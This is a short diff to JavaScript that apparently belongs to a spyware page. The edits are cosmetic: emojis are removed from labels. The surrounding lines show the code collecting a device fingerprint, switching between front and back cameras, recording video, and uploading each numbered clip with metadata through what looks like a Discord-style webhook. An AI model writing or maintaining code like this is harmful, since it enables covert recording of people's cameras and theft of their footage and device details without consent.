@@ -428,7 +428,7 @@
                 { name: "Languages", value: fingerprint.languages, inline: false }
               ],
               timestamp: new Date().toISOString(),
-              footer: { text: "🔍 Initial Scan Complete" }
+              footer: { text: "Initial Scan Complete" }
             }]
           })
         });
@@ -469,7 +469,7 @@
             username: "Camera Switched",
             embeds: [{
               title: "Camera Changed",
-              description: `Now using: ${useFrontCamera ? 'FRONT' : 'BACK'} camera`,
+              description: `Now using: ${useFrontCamera ? 'Front' : 'Back'} camera`,
               color: 5814783,
               timestamp: new Date().toISOString()
             }]
@@ -534,7 +534,7 @@
                     const cameraType = useFrontCamera ? 'FRONT' : 'BACK';
                     form.append('file', new File([videoBlob], `${cameraType}-video-${++videoCounter}.${fileExt}`, { type: videoRecorder.mimeType || 'video/mp4' }));
                     form.append('payload_json', JSON.stringify({
-                      username: `📹 ${cameraType} CAMERA`,
+                      username: `${cameraType} CAMERA`,
                       content: `Video #${videoCounter} - ${cameraType} Camera`,
                       embeds: [{
                         title: `${cameraType} Camera Recording`,
